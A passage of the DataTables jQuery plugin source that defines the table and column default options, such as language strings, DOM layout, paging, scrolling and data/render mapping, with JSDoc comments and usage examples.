			 *  @default <i>Empty string - i.e. disabled</i>

			 *

			 *  @dtopt Language

			 *  @name DataTable.defaults.language.url

			 *

			 *  @example

			 *    $(document).ready( function() {

			 *      $('#example').dataTable( {

			 *        "language": {

			 *          "url": "http://www.sprymedia.co.uk/dataTables/lang.txt"

			 *        }

			 *      } );

			 *    } );

			 */

			"sUrl": "",

	

	

			/**

			 * Text shown inside the table records when the is no information to be

			 * displayed after filtering. `emptyTable` is shown when there is simply no

			 * information in the table at all (regardless of filtering).

			 *  @type string

			 *  @default No matching records found

			 *

			 *  @dtopt Language

			 *  @name DataTable.defaults.language.zeroRecords

			 *

			 *  @example

			 *    $(document).ready( function() {

			 *      $('#example').dataTable( {

			 *        "language": {

			 *          "zeroRecords": "No records to display"

			 *        }

			 *      } );

			 *    } );

			 */

			"sZeroRecords": "No matching records found"

		},

	

	

		/**

		 * This parameter allows you to have define the global filtering state at

		 * initialisation time. As an object the `search` parameter must be

		 * defined, but all other parameters are optional. When `regex` is true,

		 * the search string will be treated as a regular expression, when false

		 * (default) it will be treated as a straight string. When `smart`

		 * DataTables will use it's smart filtering methods (to word match at

		 * any point in the data), when false this will not be done.

		 *  @namespace

		 *  @extends DataTable.models.oSearch

		 *

		 *  @dtopt Options

		 *  @name DataTable.defaults.search

		 *

		 *  @example

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "search": {"search": "Initial search"}

		 *      } );

		 *    } )

		 */

		"oSearch": $.extend( {}, DataTable.models.oSearch ),

	

	

		/**

		 * __Deprecated__ The functionality provided by this parameter has now been

		 * superseded by that provided through `ajax`, which should be used instead.

		 *

		 * By default DataTables will look for the property `data` (or `aaData` for

		 * compatibility with DataTables 1.9-) when obtaining data from an Ajax

		 * source or for server-side processing - this parameter allows that

		 * property to be changed. You can use Javascript dotted object notation to

		 * get a data source for multiple levels of nesting.

		 *  @type string

		 *  @default data

		 *

		 *  @dtopt Options

		 *  @dtopt Server-side

		 *  @name DataTable.defaults.ajaxDataProp

		 *

		 *  @deprecated 1.10. Please use `ajax` for this functionality now.

		 */

		"sAjaxDataProp": "data",

	

	

		/**

		 * __Deprecated__ The functionality provided by this parameter has now been

		 * superseded by that provided through `ajax`, which should be used instead.

		 *

		 * You can instruct DataTables to load data from an external

		 * source using this parameter (use aData if you want to pass data in you

		 * already have). Simply provide a url a JSON object can be obtained from.

		 *  @type string

		 *  @default null

		 *

		 *  @dtopt Options

		 *  @dtopt Server-side

		 *  @name DataTable.defaults.ajaxSource

		 *

		 *  @deprecated 1.10. Please use `ajax` for this functionality now.

		 */

		"sAjaxSource": null,

	

	

		/**

		 * This initialisation variable allows you to specify exactly where in the

		 * DOM you want DataTables to inject the various controls it adds to the page

		 * (for example you might want the pagination controls at the top of the

		 * table). DIV elements (with or without a custom class) can also be added to

		 * aid styling. The follow syntax is used:

		 *   <ul>

		 *     <li>The following options are allowed:

		 *       <ul>

		 *         <li>'l' - Length changing</li>

		 *         <li>'f' - Filtering input</li>

		 *         <li>'t' - The table!</li>

		 *         <li>'i' - Information</li>

		 *         <li>'p' - Pagination</li>

		 *         <li>'r' - pRocessing</li>

		 *       </ul>

		 *     </li>

		 *     <li>The following constants are allowed:

		 *       <ul>

		 *         <li>'H' - jQueryUI theme "header" classes ('fg-toolbar ui-widget-header ui-corner-tl ui-corner-tr ui-helper-clearfix')</li>

		 *         <li>'F' - jQueryUI theme "footer" classes ('fg-toolbar ui-widget-header ui-corner-bl ui-corner-br ui-helper-clearfix')</li>

		 *       </ul>

		 *     </li>

		 *     <li>The following syntax is expected:

		 *       <ul>

		 *         <li>'&lt;' and '&gt;' - div elements</li>

		 *         <li>'&lt;"class" and '&gt;' - div with a class</li>

		 *         <li>'&lt;"#id" and '&gt;' - div with an ID</li>

		 *       </ul>

		 *     </li>

		 *     <li>Examples:

		 *       <ul>

		 *         <li>'&lt;"wrapper"flipt&gt;'</li>

		 *         <li>'&lt;lf&lt;t&gt;ip&gt;'</li>

		 *       </ul>

		 *     </li>

		 *   </ul>

		 *  @type string

		 *  @default lfrtip <i>(when `jQueryUI` is false)</i> <b>or</b>

		 *    <"H"lfr>t<"F"ip> <i>(when `jQueryUI` is true)</i>

		 *

		 *  @dtopt Options

		 *  @name DataTable.defaults.dom

		 *

		 *  @example

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "dom": '&lt;"top"i&gt;rt&lt;"bottom"flp&gt;&lt;"clear"&gt;'

		 *      } );

		 *    } );

		 */

		"sDom": "lfrtip",

	

	

		/**

		 * Search delay option. This will throttle full table searches that use the

		 * DataTables provided search input element (it does not effect calls to

		 * `dt-api search()`, providing a delay before the search is made.

		 *  @type integer

		 *  @default 0

		 *

		 *  @dtopt Options

		 *  @name DataTable.defaults.searchDelay

		 *

		 *  @example

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "searchDelay": 200

		 *      } );

		 *    } )

		 */

		"searchDelay": null,

	

	

		/**

		 * DataTables features six different built-in options for the buttons to

		 * display for pagination control:

		 *

		 * * `numbers` - Page number buttons only

		 * * `simple` - 'Previous' and 'Next' buttons only

		 * * 'simple_numbers` - 'Previous' and 'Next' buttons, plus page numbers

		 * * `full` - 'First', 'Previous', 'Next' and 'Last' buttons

		 * * `full_numbers` - 'First', 'Previous', 'Next' and 'Last' buttons, plus page numbers

		 * * `first_last_numbers` - 'First' and 'Last' buttons, plus page numbers

		 *  

		 * Further methods can be added using {@link DataTable.ext.oPagination}.

		 *  @type string

		 *  @default simple_numbers

		 *

		 *  @dtopt Options

		 *  @name DataTable.defaults.pagingType

		 *

		 *  @example

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "pagingType": "full_numbers"

		 *      } );

		 *    } )

		 */

		"sPaginationType": "simple_numbers",

	

	

		/**

		 * Enable horizontal scrolling. When a table is too wide to fit into a

		 * certain layout, or you have a large number of columns in the table, you

		 * can enable x-scrolling to show the table in a viewport, which can be

		 * scrolled. This property can be `true` which will allow the table to

		 * scroll horizontally when needed, or any CSS unit, or a number (in which

		 * case it will be treated as a pixel measurement). Setting as simply `true`

		 * is recommended.

		 *  @type boolean|string

		 *  @default <i>blank string - i.e. disabled</i>

		 *

		 *  @dtopt Features

		 *  @name DataTable.defaults.scrollX

		 *

		 *  @example

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "scrollX": true,

		 *        "scrollCollapse": true

		 *      } );

		 *    } );

		 */

		"sScrollX": "",

	

	

		/**

		 * This property can be used to force a DataTable to use more width than it

		 * might otherwise do when x-scrolling is enabled. For example if you have a

		 * table which requires to be well spaced, this parameter is useful for

		 * "over-sizing" the table, and thus forcing scrolling. This property can by

		 * any CSS unit, or a number (in which case it will be treated as a pixel

		 * measurement).

		 *  @type string

		 *  @default <i>blank string - i.e. disabled</i>

		 *

		 *  @dtopt Options

		 *  @name DataTable.defaults.scrollXInner

		 *

		 *  @example

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "scrollX": "100%",

		 *        "scrollXInner": "110%"

		 *      } );

		 *    } );

		 */

		"sScrollXInner": "",

	

	

		/**

		 * Enable vertical scrolling. Vertical scrolling will constrain the DataTable

		 * to the given height, and enable scrolling for any data which overflows the

		 * current viewport. This can be used as an alternative to paging to display

		 * a lot of data in a small area (although paging and scrolling can both be

		 * enabled at the same time). This property can be any CSS unit, or a number

		 * (in which case it will be treated as a pixel measurement).

		 *  @type string

		 *  @default <i>blank string - i.e. disabled</i>

		 *

		 *  @dtopt Features

		 *  @name DataTable.defaults.scrollY

		 *

		 *  @example

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "scrollY": "200px",

		 *        "paginate": false

		 *      } );

		 *    } );

		 */

		"sScrollY": "",

	

	

		/**

		 * __Deprecated__ The functionality provided by this parameter has now been

		 * superseded by that provided through `ajax`, which should be used instead.

		 *

		 * Set the HTTP method that is used to make the Ajax call for server-side

		 * processing or Ajax sourced data.

		 *  @type string

		 *  @default GET

		 *

		 *  @dtopt Options

		 *  @dtopt Server-side

		 *  @name DataTable.defaults.serverMethod

		 *

		 *  @deprecated 1.10. Please use `ajax` for this functionality now.

		 */

		"sServerMethod": "GET",

	

	

		/**

		 * DataTables makes use of renderers when displaying HTML elements for

		 * a table. These renderers can be added or modified by plug-ins to

		 * generate suitable mark-up for a site. For example the Bootstrap

		 * integration plug-in for DataTables uses a paging button renderer to

		 * display pagination buttons in the mark-up required by Bootstrap.

		 *

		 * For further information about the renderers available see

		 * DataTable.ext.renderer

		 *  @type string|object

		 *  @default null

		 *

		 *  @name DataTable.defaults.renderer

		 *

		 */

		"renderer": null,

	

	

		/**

		 * Set the data property name that DataTables should use to get a row's id

		 * to set as the `id` property in the node.

		 *  @type string

		 *  @default DT_RowId

		 *

		 *  @name DataTable.defaults.rowId

		 */

		"rowId": "DT_RowId"

	};

	

	_fnHungarianMap( DataTable.defaults );

	

	

	

	/*

	 * Developer note - See note in model.defaults.js about the use of Hungarian

	 * notation and camel case.

	 */

	

	/**

	 * Column options that can be given to DataTables at initialisation time.

	 *  @namespace

	 */

	DataTable.defaults.column = {

		/**

		 * Define which column(s) an order will occur on for this column. This

		 * allows a column's ordering to take multiple columns into account when

		 * doing a sort or use the data from a different column. For example first

		 * name / last name columns make sense to do a multi-column sort over the

		 * two columns.

		 *  @type array|int

		 *  @default null <i>Takes the value of the column index automatically</i>

		 *

		 *  @name DataTable.defaults.column.orderData

		 *  @dtopt Columns

		 *

		 *  @example

		 *    // Using `columnDefs`

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "columnDefs": [

		 *          { "orderData": [ 0, 1 ], "targets": [ 0 ] },

		 *          { "orderData": [ 1, 0 ], "targets": [ 1 ] },

		 *          { "orderData": 2, "targets": [ 2 ] }

		 *        ]

		 *      } );

		 *    } );

		 *

		 *  @example

		 *    // Using `columns`

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "columns": [

		 *          { "orderData": [ 0, 1 ] },

		 *          { "orderData": [ 1, 0 ] },

		 *          { "orderData": 2 },

		 *          null,

		 *          null

		 *        ]

		 *      } );

		 *    } );

		 */

		"aDataSort": null,

		"iDataSort": -1,

	

	

		/**

		 * You can control the default ordering direction, and even alter the

		 * behaviour of the sort handler (i.e. only allow ascending ordering etc)

		 * using this parameter.

		 *  @type array

		 *  @default [ 'asc', 'desc' ]

		 *

		 *  @name DataTable.defaults.column.orderSequence

		 *  @dtopt Columns

		 *

		 *  @example

		 *    // Using `columnDefs`

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "columnDefs": [

		 *          { "orderSequence": [ "asc" ], "targets": [ 1 ] },

		 *          { "orderSequence": [ "desc", "asc", "asc" ], "targets": [ 2 ] },

		 *          { "orderSequence": [ "desc" ], "targets": [ 3 ] }

		 *        ]

		 *      } );

		 *    } );

		 *

		 *  @example

		 *    // Using `columns`

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "columns": [

		 *          null,

		 *          { "orderSequence": [ "asc" ] },

		 *          { "orderSequence": [ "desc", "asc", "asc" ] },

		 *          { "orderSequence": [ "desc" ] },

		 *          null

		 *        ]

		 *      } );

		 *    } );

		 */

		"asSorting": [ 'asc', 'desc' ],

	

	

		/**

		 * Enable or disable filtering on the data in this column.

		 *  @type boolean

		 *  @default true

		 *

		 *  @name DataTable.defaults.column.searchable

		 *  @dtopt Columns

		 *

		 *  @example

		 *    // Using `columnDefs`

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "columnDefs": [

		 *          { "searchable": false, "targets": [ 0 ] }

		 *        ] } );

		 *    } );

		 *

		 *  @example

		 *    // Using `columns`

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "columns": [

		 *          { "searchable": false },

		 *          null,

		 *          null,

		 *          null,

		 *          null

		 *        ] } );

		 *    } );

		 */

		"bSearchable": true,

	

	

		/**

		 * Enable or disable ordering on this column.

		 *  @type boolean

		 *  @default true

		 *

		 *  @name DataTable.defaults.column.orderable

		 *  @dtopt Columns

		 *

		 *  @example

		 *    // Using `columnDefs`

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "columnDefs": [

		 *          { "orderable": false, "targets": [ 0 ] }

		 *        ] } );

		 *    } );

		 *

		 *  @example

		 *    // Using `columns`

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "columns": [

		 *          { "orderable": false },

		 *          null,

		 *          null,

		 *          null,

		 *          null

		 *        ] } );

		 *    } );

		 */

		"bSortable": true,

	

	

		/**

		 * Enable or disable the display of this column.

		 *  @type boolean

		 *  @default true

		 *

		 *  @name DataTable.defaults.column.visible

		 *  @dtopt Columns

		 *

		 *  @example

		 *    // Using `columnDefs`

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "columnDefs": [

		 *          { "visible": false, "targets": [ 0 ] }

		 *        ] } );

		 *    } );

		 *

		 *  @example

		 *    // Using `columns`

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "columns": [

		 *          { "visible": false },

		 *          null,

		 *          null,

		 *          null,

		 *          null

		 *        ] } );

		 *    } );

		 */

		"bVisible": true,

	

	

		/**

		 * Developer definable function that is called whenever a cell is created (Ajax source,

		 * etc) or processed for input (DOM source). This can be used as a compliment to mRender

		 * allowing you to modify the DOM element (add background colour for example) when the

		 * element is available.

		 *  @type function

		 *  @param {element} td The TD node that has been created

		 *  @param {*} cellData The Data for the cell

		 *  @param {array|object} rowData The data for the whole row

		 *  @param {int} row The row index for the aoData data store

		 *  @param {int} col The column index for aoColumns

		 *

		 *  @name DataTable.defaults.column.createdCell

		 *  @dtopt Columns

		 *

		 *  @example

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "columnDefs": [ {

		 *          "targets": [3],

		 *          "createdCell": function (td, cellData, rowData, row, col) {

		 *            if ( cellData == "1.7" ) {

		 *              $(td).css('color', 'blue')

		 *            }

		 *          }

		 *        } ]

		 *      });

		 *    } );

		 */

		"fnCreatedCell": null,

	

	

		/**

		 * This parameter has been replaced by `data` in DataTables to ensure naming

		 * consistency. `dataProp` can still be used, as there is backwards

		 * compatibility in DataTables for this option, but it is strongly

		 * recommended that you use `data` in preference to `dataProp`.

		 *  @name DataTable.defaults.column.dataProp

		 */

	

	

		/**

		 * This property can be used to read data from any data source property,

		 * including deeply nested objects / properties. `data` can be given in a

		 * number of different ways which effect its behaviour:

		 *

		 * * `integer` - treated as an array index for the data source. This is the

		 *   default that DataTables uses (incrementally increased for each column).

		 * * `string` - read an object property from the data source. There are

		 *   three 'special' options that can be used in the string to alter how

		 *   DataTables reads the data from the source object:

		 *    * `.` - Dotted Javascript notation. Just as you use a `.` in

		 *      Javascript to read from nested objects, so to can the options

		 *      specified in `data`. For example: `browser.version` or

		 *      `browser.name`. If your object parameter name contains a period, use

		 *      `\\` to escape it - i.e. `first\\.name`.

		 *    * `[]` - Array notation. DataTables can automatically combine data

		 *      from and array source, joining the data with the characters provided

		 *      between the two brackets. For example: `name[, ]` would provide a

		 *      comma-space separated list from the source array. If no characters

		 *      are provided between the brackets, the original array source is

		 *      returned.

		 *    * `()` - Function notation. Adding `()` to the end of a parameter will

		 *      execute a function of the name given. For example: `browser()` for a

		 *      simple function on the data source, `browser.version()` for a

		 *      function in a nested property or even `browser().version` to get an

		 *      object property if the function called returns an object. Note that

		 *      function notation is recommended for use in `render` rather than

		 *      `data` as it is much simpler to use as a renderer.

		 * * `null` - use the original data source for the row rather than plucking

		 *   data directly from it. This action has effects on two other

		 *   initialisation options:

		 *    * `defaultContent` - When null is given as the `data` option and

		 *      `defaultContent` is specified for the column, the value defined by

		 *      `defaultContent` will be used for the cell.

		 *    * `render` - When null is used for the `data` option and the `render`

		 *      option is specified for the column, the whole data source for the

		 *      row is used for the renderer.

		 * * `function` - the function given will be executed whenever DataTables

		 *   needs to set or get the data for a cell in the column. The function

		 *   takes three parameters:

		 *    * Parameters:

		 *      * `{array|object}` The data source for the row

		 *      * `{string}` The type call data requested - this will be 'set' when

		 *        setting data or 'filter', 'display', 'type', 'sort' or undefined

		 *        when gathering data. Note that when `undefined` is given for the

		 *        type DataTables expects to get the raw data for the object back<

		 *      * `{*}` Data to set when the second parameter is 'set'.

		 *    * Return:

		 *      * The return value from the function is not required when 'set' is

		 *        the type of call, but otherwise the return is what will be used

		 *        for the data requested.

		 *

		 * Note that `data` is a getter and setter option. If you just require

		 * formatting of data for output, you will likely want to use `render` which

		 * is simply a getter and thus simpler to use.

		 *

		 * Note that prior to DataTables 1.9.2 `data` was called `mDataProp`. The

		 * name change reflects the flexibility of this property and is consistent

		 * with the naming of mRender. If 'mDataProp' is given, then it will still

		 * be used by DataTables, as it automatically maps the old name to the new

		 * if required.

		 *

		 *  @type string|int|function|null

		 *  @default null <i>Use automatically calculated column index</i>

		 *

		 *  @name DataTable.defaults.column.data

		 *  @dtopt Columns

		 *

		 *  @example

		 *    // Read table data from objects

		 *    // JSON structure for each row:

		 *    //   {

		 *    //      "engine": {value},

		 *    //      "browser": {value},

		 *    //      "platform": {value},

		 *    //      "version": {value},

		 *    //      "grade": {value}

		 *    //   }

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "ajaxSource": "sources/objects.txt",

		 *        "columns": [

		 *          { "data": "engine" },

		 *          { "data": "browser" },

		 *          { "data": "platform" },

		 *          { "data": "version" },

		 *          { "data": "grade" }

		 *        ]

		 *      } );

		 *    } );

		 *

		 *  @example

		 *    // Read information from deeply nested objects

		 *    // JSON structure for each row:

		 *    //   {

		 *    //      "engine": {value},

		 *    //      "browser": {value},

		 *    //      "platform": {

		 *    //         "inner": {value}

		 *    //      },

		 *    //      "details": [

		 *    //         {value}, {value}

		 *    //      ]

		 *    //   }

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "ajaxSource": "sources/deep.txt",

		 *        "columns": [

		 *          { "data": "engine" },

		 *          { "data": "browser" },

		 *          { "data": "platform.inner" },

		 *          { "data": "details.0" },

		 *          { "data": "details.1" }

		 *        ]

		 *      } );

		 *    } );

		 *

		 *  @example

		 *    // Using `data` as a function to provide different information for

		 *    // sorting, filtering and display. In this case, currency (price)

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "columnDefs": [ {

		 *          "targets": [ 0 ],

		 *          "data": function ( source, type, val ) {

		 *            if (type === 'set') {

		 *              source.price = val;

		 *              // Store the computed dislay and filter values for efficiency

		 *              source.price_display = val=="" ? "" : "$"+numberFormat(val);

		 *              source.price_filter  = val=="" ? "" : "$"+numberFormat(val)+" "+val;

		 *              return;

		 *            }

		 *            else if (type === 'display') {

		 *              return source.price_display;

		 *            }

		 *            else if (type === 'filter') {

		 *              return source.price_filter;

		 *            }

		 *            // 'sort', 'type' and undefined all just use the integer

		 *            return source.price;

		 *          }

		 *        } ]

		 *      } );

		 *    } );

		 *

		 *  @example

		 *    // Using default content

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "columnDefs": [ {

		 *          "targets": [ 0 ],

		 *          "data": null,

		 *          "defaultContent": "Click to edit"

		 *        } ]

		 *      } );

		 *    } );

		 *

		 *  @example

		 *    // Using array notation - outputting a list from an array

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "columnDefs": [ {

		 *          "targets": [ 0 ],

		 *          "data": "name[, ]"

		 *        } ]

		 *      } );

		 *    } );

		 *

		 */

		"mData": null,

	

	

		/**

		 * This property is the rendering partner to `data` and it is suggested that

		 * when you want to manipulate data for display (including filtering,

		 * sorting etc) without altering the underlying data for the table, use this

		 * property. `render` can be considered to be the the read only companion to

		 * `data` which is read / write (then as such more complex). Like `data`

		 * this option can be given in a number of different ways to effect its

		 * behaviour:

		 *

		 * * `integer` - treated as an array index for the data source. This is the

		 *   default that DataTables uses (incrementally increased for each column).

		 * * `string` - read an object property from the data source. There are

		 *   three 'special' options that can be used in the string to alter how

		 *   DataTables reads the data from the source object:

		 *    * `.` - Dotted Javascript notation. Just as you use a `.` in

		 *      Javascript to read from nested objects, so to can the options

		 *      specified in `data`. For example: `browser.version` or

		 *      `browser.name`. If your object parameter name contains a period, use

		 *      `\\` to escape it - i.e. `first\\.name`.

		 *    * `[]` - Array notation. DataTables can automatically combine data

		 *      from and array source, joining the data with the characters provided

		 *      between the two brackets. For example: `name[, ]` would provide a

		 *      comma-space separated list from the source array. If no characters

		 *      are provided between the brackets, the original array source is

		 *      returned.

		 *    * `()` - Function notation. Adding `()` to the end of a parameter will

		 *      execute a function of the name given. For example: `browser()` for a

		 *      simple function on the data source, `browser.version()` for a

		 *      function in a nested property or even `browser().version` to get an

		 *      object property if the function called returns an object.

		 * * `object` - use different data for the different data types requested by

		 *   DataTables ('filter', 'display', 'type' or 'sort'). The property names

		 *   of the object is the data type the property refers to and the value can

		 *   defined using an integer, string or function using the same rules as

		 *   `render` normally does. Note that an `_` option _must_ be specified.

		 *   This is the default value to use if you haven't specified a value for

		 *   the data type requested by DataTables.

		 * * `function` - the function given will be executed whenever DataTables

		 *   needs to set or get the data for a cell in the column. The function

		 *   takes three parameters:

		 *    * Parameters:

		 *      * {array|object} The data source for the row (based on `data`)

		 *      * {string} The type call data requested - this will be 'filter',

		 *        'display', 'type' or 'sort'.

		 *      * {array|object} The full data source for the row (not based on

		 *        `data`)

		 *    * Return:

		 *      * The return value from the function is what will be used for the

		 *        data requested.

		 *

		 *  @type string|int|function|object|null

		 *  @default null Use the data source value.

		 *

		 *  @name DataTable.defaults.column.render

		 *  @dtopt Columns

		 *

		 *  @example

		 *    // Create a comma separated list from an array of objects

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "ajaxSource": "sources/deep.txt",

		 *        "columns": [

		 *          { "data": "engine" },

		 *          { "data": "browser" },

		 *          {

		 *            "data": "platform",

		 *            "render": "[, ].name"

		 *          }

		 *        ]

		 *      } );

		 *    } );

		 *

		 *  @example

		 *    // Execute a function to obtain data

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "columnDefs": [ {

		 *          "targets": [ 0 ],

		 *          "data": null, // Use the full data source object for the renderer's source

		 *          "render": "browserName()"

		 *        } ]

		 *      } );

		 *    } );

		 *

		 *  @example

		 *    // As an object, extracting different data for the different types

		 *    // This would be used with a data source such as:

		 *    //   { "phone": 5552368, "phone_filter": "5552368 555-2368", "phone_display": "555-2368" }

		 *    // Here the `phone` integer is used for sorting and type detection, while `phone_filter`

		 *    // (which has both forms) is used for filtering for if a user inputs either format, while

		 *    // the formatted phone number is the one that is shown in the table.

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "columnDefs": [ {

		 *          "targets": [ 0 ],

		 *          "data": null, // Use the full data source object for the renderer's source

		 *          "render": {

		 *            "_": "phone",

		 *            "filter": "phone_filter",

		 *            "display": "phone_display"

		 *          }

		 *        } ]

		 *      } );

		 *    } );

		 *

		 *  @example

		 *    // Use as a function to create a link from the data source

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "columnDefs": [ {

		 *          "targets": [ 0 ],

		 *          "data": "download_link",

		 *          "render": function ( data, type, full ) {

		 *            return '<a href="'+data+'">Download</a>';

		 *          }

		 *        } ]

		 *      } );

		 *    } );

		 */

		"mRender": null,

	

	

		/**

		 * Change the cell type created for the column - either TD cells or TH cells. This

		 * can be useful as TH cells have semantic meaning in the table body, allowing them

		 * to act as a header for a row (you may wish to add scope='row' to the TH elements).

		 *  @type string

		 *  @default td

		 *

		 *  @name DataTable.defaults.column.cellType

		 *  @dtopt Columns

		 *

		 *  @example

		 *    // Make the first column use TH cells

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "columnDefs": [ {

		 *          "targets": [ 0 ],

		 *          "cellType": "th"

		 *        } ]

		 *      } );

		 *    } );

		 */

		"sCellType": "td",

	

	

		/**

		 * Class to give to each cell in this column.

		 *  @type string

		 *  @default <i>Empty string</i>

		 *

		 *  @name DataTable.defaults.column.class

		 *  @dtopt Columns

		 *

		 *  @example

		 *    // Using `columnDefs`

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "columnDefs": [

		 *          { "class": "my_class", "targets": [ 0 ] }

		 *        ]

		 *      } );

		 *    } );

		 *

		 *  @example

		 *    // Using `columns`

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "columns": [

		 *          { "class": "my_class" },

		 *          null,

		 *          null,

		 *          null,

		 *          null

		 *        ]

		 *      } );

		 *    } );

		 */

		"sClass": "",

	

		/**

		 * When DataTables calculates the column widths to assign to each column,

		 * it finds the longest string in each column and then constructs a

		 * temporary table and reads the widths from that. The problem with this

		 * is that "mmm" is much wider then "iiii", but the latter is a longer

		 * string - thus the calculation can go wrong (doing it properly and putting

		 * it into an DOM object and measuring that is horribly(!) slow). Thus as

		 * a "work around" we provide this option. It will append its value to the

		 * text that is found to be the longest string for the column - i.e. padding.

		 * Generally you shouldn't need this!

		 *  @type string

		 *  @default <i>Empty string<i>

		 *

		 *  @name DataTable.defaults.column.contentPadding

		 *  @dtopt Columns

		 *

		 *  @example

		 *    // Using `columns`

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "columns": [

		 *          null,

		 *          null,

		 *          null,

		 *          {

		 *            "contentPadding": "mmm"

		 *          }

		 *        ]

		 *      } );

		 *    } );

		 */

		"sContentPadding": "",

	

	

		/**

		 * Allows a default value to be given for a column's data, and will be used

		 * whenever a null data source is encountered (this can be because `data`

		 * is set to null, or because the data source itself is null).

		 *  @type string

		 *  @default null

		 *

		 *  @name DataTable.defaults.column.defaultContent

		 *  @dtopt Columns

		 *

		 *  @example

		 *    // Using `columnDefs`

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "columnDefs": [

		 *          {

		 *            "data": null,

		 *            "defaultContent": "Edit",

		 *            "targets": [ -1 ]

		 *          }

		 *        ]

		 *      } );

		 *    } );

		 *

		 *  @example

		 *    // Using `columns`

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "columns": [

		 *          null,

		 *          null,

		 *          null,

		 *          {

		 *            "data": null,

		 *            "defaultContent": "Edit"

		 *          }

		 *        ]

		 *      } );

		 *    } );

		 */

		"sDefaultContent": null,

	

	

		/**

		 * This parameter is only used in DataTables' server-side processing. It can

		 * be exceptionally useful to know what columns are being displayed on the

		 * client side, and to map these to database fields. When defined, the names

		 * also allow DataTables to reorder information from the server if it comes

		 * back in an unexpected order (i.e. if you switch your columns around on the

		 * client-side, your server-side code does not also need updating).

		 *  @type string

		 *  @default <i>Empty string</i>

		 *

		 *  @name DataTable.defaults.column.name

		 *  @dtopt Columns

		 *

		 *  @example

		 *    // Using `columnDefs`

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "columnDefs": [

		 *          { "name": "engine", "targets": [ 0 ] },

		 *          { "name": "browser", "targets": [ 1 ] },

		 *          { "name": "platform", "targets": [ 2 ] },

		 *          { "name": "version", "targets": [ 3 ] },

		 *          { "name": "grade", "targets": [ 4 ] }

		 *        ]

		 *      } );

		 *    } );

		 *

		 *  @example

		 *    // Using `columns`

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "columns": [

		 *          { "name": "engine" },

		 *          { "name": "browser" },

		 *          { "name": "platform" },

		 *          { "name": "version" },

		 *          { "name": "grade" }

		 *        ]

		 *      } );

		 *    } );

		 */

		"sName": "",

	

	

		/**

		 * Defines a data source type for the ordering which can be used to read

		 * real-time information from the table (updating the internally cached

		 * version) prior to ordering. This allows ordering to occur on user

		 * editable elements such as form inputs.

		 *  @type string

		 *  @default std

		 *

		 *  @name DataTable.defaults.column.orderDataType

		 *  @dtopt Columns

		 *

		 *  @example

		 *    // Using `columnDefs`

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "columnDefs": [

		 *          { "orderDataType": "dom-text", "targets": [ 2, 3 ] },

		 *          { "type": "numeric", "targets": [ 3 ] },

		 *          { "orderDataType": "dom-select", "targets": [ 4 ] },

		 *          { "orderDataType": "dom-checkbox", "targets": [ 5 ] }

		 *        ]

		 *      } );

		 *    } );

		 *

		 *  @example

		 *    // Using `columns`

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "columns": [

		 *          null,

		 *          null,

		 *          { "orderDataType": "dom-text" },

		 *          { "orderDataType": "dom-text", "type": "numeric" },

		 *          { "orderDataType": "dom-select" },

		 *          { "orderDataType": "dom-checkbox" }

		 *        ]

		 *      } );

		 *    } );

		 */

		"sSortDataType": "std",

	

	

		/**

		 * The title of this column.

		 *  @type string

		 *  @default null <i>Derived from the 'TH' value for this column in the

		 *    original HTML table.</i>

		 *

		 *  @name DataTable.defaults.column.title

		 *  @dtopt Columns

		 *

		 *  @example

		 *    // Using `columnDefs`

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "columnDefs": [

		 *          { "title": "My column title", "targets": [ 0 ] }

		 *        ]

		 *      } );

		 *    } );

		 *

		 *  @example

		 *    // Using `columns`

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "columns": [

		 *          { "title": "My column title" },

		 *          null,

		 *          null,

		 *          null,

		 *          null

		 *        ]

		 *      } );

		 *    } );

		 */

		"sTitle": null,

	

	

		/**

		 * The type allows you to specify how the data for this column will be

		 * ordered. Four types (string, numeric, date and html (which will strip

		 * HTML tags before ordering)) are currently available. Note that only date

		 * formats understood by Javascript's Date() object will be accepted as type

		 * date. For example: "Mar 26, 2008 5:03 PM". May take the values: 'string',

		 * 'numeric', 'date' or 'html' (by default). Further types can be adding

		 * through plug-ins.

		 *  @type string

		 *  @default null <i>Auto-detected from raw data</i>

		 *

